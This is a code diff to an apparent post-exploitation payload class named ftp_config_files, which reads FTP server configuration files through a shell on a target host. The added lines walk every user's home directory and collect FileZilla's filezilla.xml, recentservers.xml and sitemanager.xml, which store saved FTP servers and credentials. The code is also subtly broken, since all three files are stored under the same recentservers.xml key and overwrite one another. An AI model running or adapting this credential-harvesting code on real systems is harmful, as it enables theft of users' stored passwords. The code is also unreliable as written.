@@ -33,11 +33,22 @@ class ftp_config_files(base_payload):
         files.append('/etc/xinetd.d/wu-ftpd')
         files.append('/opt/bin/ftponly')
 
-
         for file in files:
             content = self.shell.read(file)
             if content:
                 result.update({file:content})
+
+        users_name = self.exec_payload('users_name').values()
+        for user_home in users_name:
+            filezilla_content = self.shell.read(user_home+'.filezilla/filezilla.xml')
+            recent_content = self.shell.read(user_home+'.filezilla/recentservers.xml')
+            sitemanager_content = self.shell.read(user_home+'.filezilla/sitemanager.xml')
+            if filezilla_content:
+                result.update({user_home+'.filezilla/recentservers.xml':filezilla_content})
+            if recent_content:
+                result.update({user_home+'.filezilla/recentservers.xml':recent_content})
+            if sitemanager_content:
+                result.update({user_home+'.filezilla/recentservers.xml':sitemanager_content})
         return result
     
     def run_read(self):
